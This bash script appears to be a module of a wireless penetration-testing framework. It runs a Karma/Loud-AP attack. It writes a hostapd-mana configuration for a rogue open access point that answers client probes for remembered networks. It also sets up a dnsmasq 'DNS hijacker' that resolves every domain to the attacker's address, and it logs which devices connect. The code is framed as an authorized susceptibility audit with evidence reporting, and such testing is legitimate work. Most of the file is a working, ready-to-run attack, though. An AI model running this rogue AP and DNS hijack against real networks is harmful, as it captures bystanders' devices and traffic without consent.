#!/usr/bin/env bash
# MODULE_META
# NAME="PineAP / Karma Attack"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="hostapd-mana,dnsmasq,mdk4"
# DESC="Test client susceptibility to Karma/Loud AP attacks (responding to all probes)"
# REQS="managed_iface,nat"
# PCAP="yes"
# TIMED="yes"
# PROMPTS="karma_vector"
# DECODE="dhcp"

#===============================================================================
#  modules/f2_pineap_karma.sh
#  F2: PineAP / Karma Attack (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Deploy a rogue Access Point using 'hostapd-mana'.
#  2. Tactical selection: Dynamic Karma vs. Static Known Beacon Attack.
#  3. Provide DHCP/DNS services via dnsmasq (Go-Core NAT).
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
_AP_IFACE="${AP_INTERFACE:-}"

# Derive physical interface name upfront so cleanup can reference it before the toggle.
_RAW_IFACE="${WIFI_INTERFACE:-${MONITOR_INTERFACE:-}}"
if [[ "$_RAW_IFACE" == *mon ]]; then
    _PHYS_IFACE="${_RAW_IFACE%mon}"
else
    _PHYS_IFACE="$_RAW_IFACE"
fi

# Register cleanup trap BEFORE any adapter manipulation so the interface is
# always restored to monitor mode even if the script exits early via set -e.
cleanup() {
    echo -e "${C_PROMPT}[*]${C_RESET} Tearing down Karma environment..."
    [[ -n "${MANA_PID:-}" ]] && kill "$MANA_PID" 2>/dev/null || true
    [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
    ip addr flush dev "${INTERFACE:-}" 2>/dev/null || true
    if [[ -z "${_AP_IFACE:-}" && -n "${_PHYS_IFACE:-}" ]]; then
        airmon-ng start "$_PHYS_IFACE" > /dev/null 2>&1 || {
            ip link set "$_PHYS_IFACE" down 2>/dev/null || true
            iw dev "$_PHYS_IFACE" set type monitor 2>/dev/null || true
            ip link set "$_PHYS_IFACE" up 2>/dev/null || true
        }
    fi
    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
}
trap cleanup EXIT

if [[ -n "$_AP_IFACE" ]]; then
    # Full dual-adapter mode — AP card stays in managed mode throughout.
    INTERFACE="$_AP_IFACE"
else
    # Degraded single-adapter mode — toggle physical card to managed mode.
    if [[ -z "$_PHYS_IFACE" ]]; then
        echo "[!] Cannot derive physical interface. Set AP_INTERFACE or ensure WIFI_INTERFACE is set."
        exit 1
    fi
    echo "[*] Restoring ${_PHYS_IFACE} to managed mode for AP operation..."
    airmon-ng stop "${MONITOR_INTERFACE}" > /dev/null 2>&1 || true
    ip link set "$_PHYS_IFACE" down 2>/dev/null || true
    iw dev "$_PHYS_IFACE" set type managed 2>/dev/null || true
    ip link set "$_PHYS_IFACE" up 2>/dev/null || true
    sleep 1
    INTERFACE="$_PHYS_IFACE"
fi
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/f2"
SCAN_TIME="${SCAN_TIME:-120}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F2"
INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"

# Tactical Selections from Go Brain
KARMA_MODE="${KARMA_MODE:-mana}" # mana or loud

if [[ -z "${GUEST_CHANNEL:-}" ]]; then
    echo "[!] WARNING: GUEST_CHANNEL not set — Karma AP will default to channel 6."
    echo "    Clients on other channels may not see it. Run A1 and select a target first."
fi

if [[ -z "$INTERFACE" ]]; then
    echo "[!] No AP interface available (AP_INTERFACE and MONITOR_INTERFACE are both unset)."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting Karma attack on ${C_VAR}${INTERFACE}${C_RESET}..."

# 1. Configuration
MANA_LOUD="0"
if [[ "$KARMA_MODE" == "loud" ]]; then
    echo -e "[*] Enabling ${C_VAR}Known Beacon Attack${C_RESET} (Loud AP Mode)..."
    MANA_LOUD="1"
fi

MANA_CONF="${EVIDENCE_PREFIX}_mana.conf"
DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
MANA_LOG="${EVIDENCE_DIR}/${TC_ID}_mana.log"
DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"

cat <<EOF > "$MANA_CONF"
interface=$INTERFACE
driver=nl80211
ssid=GuestWiFi
hw_mode=g
channel=${GUEST_CHANNEL:-6}
auth_algs=1
wpa=0
mana_wpe=1
mana_loud=$MANA_LOUD
mana_cross_cmds=1
EOF

cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.44.10,192.168.44.100,12h
dhcp-option=3,$INTERNAL_IP
dhcp-option=6,$INTERNAL_IP
address=/#/$INTERNAL_IP
log-queries
log-dhcp
EOF

# 2. Execution

# Start dynamic telemetry heartbeat
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 50 --status "Karma attack active — ${ELAPSED}s elapsed (Ctrl+C to stop)"
            sleep 5
            ((ELAPSED+=5))
            continue
        fi
        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
        STATUS="Karma active (monitoring probes)... ($(( SCAN_TIME - ELAPSED ))s left)"
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
        sleep 5
        ((ELAPSED+=5))
    done
) &
TEL_PID=$!

echo -e "[*] Starting DNS hijacker..."
# Assign IP to AP interface so dnsmasq can bind and respond to DHCP discover packets.
ip addr flush dev "$INTERFACE" 2>/dev/null || true
if ip addr add "${INTERNAL_IP}/24" dev "$INTERFACE" 2>/dev/null; then
    echo "[*] AP interface ${INTERFACE} → ${INTERNAL_IP}/24"
else
    echo "[!] Warning: could not assign ${INTERNAL_IP}/24 to ${INTERFACE} — DHCP will not work."
fi
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    dnsmasq -C "$DNSMASQ_CONF" -k 2>&1 | tee "$DNSMASQ_LOG" &
else
    dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
fi
DNSMASQ_PID=$!

if command -v hostapd-mana &>/dev/null; then
    echo -e "[*] Starting hostapd-mana..."
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        # FOREGROUND
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            hostapd-mana "$MANA_CONF" 2>&1 | tee "$MANA_LOG" || true
        else
            timeout --foreground "$SCAN_TIME" hostapd-mana "$MANA_CONF" 2>&1 | tee "$MANA_LOG" || true
        fi
    else
        # BACKGROUND
        if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
            hostapd-mana "$MANA_CONF" > "$MANA_LOG" 2>&1 &
        else
            timeout "$SCAN_TIME" hostapd-mana "$MANA_CONF" > "$MANA_LOG" 2>&1 &
        fi
        MANA_PID=$!
        wait "$MANA_PID" 2>/dev/null || true
    fi

    cleanup
    trap - EXIT

    # 4. Reporting
    if grep -qi "authenticated" "$MANA_LOG"; then
        V_MAC=$(grep -i "authenticated" "$MANA_LOG" | awk '{print $3}' | head -1)
        echo -e "[!] ${C_BOLD}SUCCESS: CLIENT CAPTURED VIA KARMA!${C_RESET}"
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "Karma Attack Susceptibility" \
            --severity CRITICAL \
            --desc "A client device (${V_MAC:-Unknown}) connected to a phantom SSID generated by the Karma attack." \
            --target "Global" \
            --evidence "$MANA_LOG" \
            --rationale "Clients broadcasting directed probes for past networks (PNL) are highly vulnerable."
    else
        echo -e "[+] Karma attack complete. No clients captured."
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[F2] Audit Complete" \
            --severity INFO \
            --desc "Karma/PineAP attack ran for ${SCAN_TIME}s — no clients connected to phantom SSIDs." \
            --target "Global" \
            --evidence "$MANA_LOG" \
            --rationale "No PNL-susceptible clients detected during the test window. Clients may be using randomized MACs or have no saved open-network profiles."
    fi
else
    echo "[!] hostapd-mana not found. Skipping Karma test."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F2] Audit Incomplete — hostapd-mana Missing" \
        --severity INFO \
        --desc "Karma/PineAP attack could not be executed because hostapd-mana is not installed." \
        --target "Global" \
        --evidence "${MANA_LOG:-/dev/null}" \
        --rationale "Install hostapd-mana (Kali: apt install hostapd-mana) to enable PNL/Karma susceptibility testing."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
